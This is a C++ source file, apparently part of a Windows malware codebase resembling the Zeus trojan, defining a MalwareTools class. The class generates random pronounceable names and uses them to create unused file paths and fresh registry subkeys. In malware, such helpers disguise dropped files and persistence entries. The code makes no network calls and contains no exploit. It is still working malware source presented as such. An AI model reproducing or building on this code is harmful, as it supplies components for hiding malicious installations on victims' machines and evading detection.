#include<WinSock2.h>
#include <windows.h>
#include <netfw.h>
#include <shlobj.h>
#include <shellapi.h>
#include <security.h>
#include<Shlwapi.h>

#include"defines.h"
#include"defines.h"

#include "malwaretools.h"
#include "time.h"
#include "mem.h"
#include "str.h"
#include "fs.h"

void MalwareTools::init(void)
{

}

void MalwareTools::uninit(void)
{

}

//to crypt
void MalwareTools::_GenerateRandomNameW(DWORD dwCaseFlags, LPWSTR pstrName, BYTE bMinChars, BYTE bMaxChars)
{
  static const char chars_list1[] = {'q', 'w', 'r', 't', 'p', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'z', 'x', 'c', 'v', 'b', 'n'};
  static const char chars_list2[] = {'a', 'e', 'i', 'o', 'u', 'y'};

  //The name.
  DWORD dwNameLen = Crypt::mtRandRange(bMinChars, bMaxChars);

  //The order of characters.
  char *list[2];
  if(Crypt::mtRand() & 0x100)
  {
    list[0] = (char *)chars_list1;
    list[1] = (char *)chars_list2;
  }
  else
  {
    list[0] = (char *)chars_list2;
    list[1] = (char *)chars_list1;
  }

  DWORD lastSpaceIndex = 0;
  for(DWORD i = 0, chr = 0; i < dwNameLen; i++, chr++)
  {
    if(chr == 2)
    {
      //Change the order of characters.
      if(Crypt::mtRand() & 0x100)
      {
        list[0] = (char *)chars_list1;
        list[1] = (char *)chars_list2;
      }
      else
      {
        list[0] = (char *)chars_list2;
        list[1] = (char *)chars_list1;
      }
      chr = 0;
    }

    //pick a character.
    DWORD dwMax = list[chr] == chars_list1 ? sizeof(chars_list1) / sizeof(chars_list1[0]) : sizeof(chars_list2) / sizeof(chars_list2[0]);
    
    if(dwCaseFlags & NCF_ALLOW_SPACES && i - lastSpaceIndex > 1 && (Crypt::mtRand() & 0x101) == 0x101)
    {
      pstrName[i] = ' ';
      lastSpaceIndex = i;
    }
    else pstrName[i] = list[chr][Crypt::mtRandRange(0, dwMax - 1)];
  }

  //Remove spaces.
  if(dwCaseFlags & NCF_ALLOW_SPACES)while(dwNameLen > 0 && pstrName[dwNameLen - 1] == ' ')dwNameLen--;
  
  //Completing the line.
  pstrName[dwNameLen] = 0;
  
  //control 1st character casing.
  if(dwCaseFlags & NCF_FIRST_UPPER)pstrName[0] = LOWORD(CWA(user32, CharUpperW)((LPWSTR)(pstrName[0])));
}

void MalwareTools::_GenerateRandomNameA(DWORD dwCaseFlags, LPSTR pstrName, BYTE bMinChars, BYTE bMaxChars)
{
  WCHAR name[257];
  _GenerateRandomNameW(dwCaseFlags, name, bMinChars, bMaxChars);
  Str::_unicodeToAnsi(name, -1, pstrName, 257);
}
//fs
bool MalwareTools::_GenerateRandomFileName(DWORD dwCaseFlags, LPWSTR pstrPath, LPWSTR pstrName, LPWSTR pstrExtension, BYTE bMinChars, BYTE bMaxChars)
{
  WCHAR tmpName[MAX_PATH];
  
  for(DWORD i = 0; i < 100; i++)
  {
    _GenerateRandomNameW(dwCaseFlags, tmpName, bMinChars, bMaxChars);
    
    if(Fs::_pathCombine(pstrName, pstrPath, tmpName))
    {
      if(pstrExtension != NULL && CWA(shlwapi, PathAddExtensionW)(pstrName, pstrExtension) == FALSE)continue;
      if(CWA(kernel32, GetFileAttributesW)(pstrName) == INVALID_FILE_ATTRIBUTES)return true;
    }
  }
  
  return false;
}
//registry
bool MalwareTools::_GenerateRandomRegKeyName(DWORD dwCaseFlags, HKEY hRoot, LPWSTR pstrPath, LPWSTR pstrName, BYTE bMinChars, BYTE bMaxChars)
{
	HKEY hCur;
	bool ok = false;

	if(CWA(advapi32, RegCreateKeyExW)(hRoot, pstrPath, 0, NULL, 0, KEY_CREATE_SUB_KEY, NULL, &hCur, NULL) == ERROR_SUCCESS)
	{
		DWORD dwDisposition;
		HKEY hSub;

		for(DWORD i = 0; i < 100; i++)
		{
			_GenerateRandomNameW(dwCaseFlags, pstrName, bMinChars, bMaxChars);

			if(CWA(advapi32, RegCreateKeyExW)(hCur, pstrName, 0, NULL, 0, KEY_QUERY_VALUE | KEY_SET_VALUE, NULL, &hSub, &dwDisposition) == ERROR_SUCCESS)
			{
				CWA(advapi32, RegCloseKey)(hSub);

				if(dwDisposition == REG_CREATED_NEW_KEY)
				{
					ok = true;
					break;
				}
			}
		}

		CWA(advapi32, RegCloseKey)(hCur);
	}

	return ok;
}

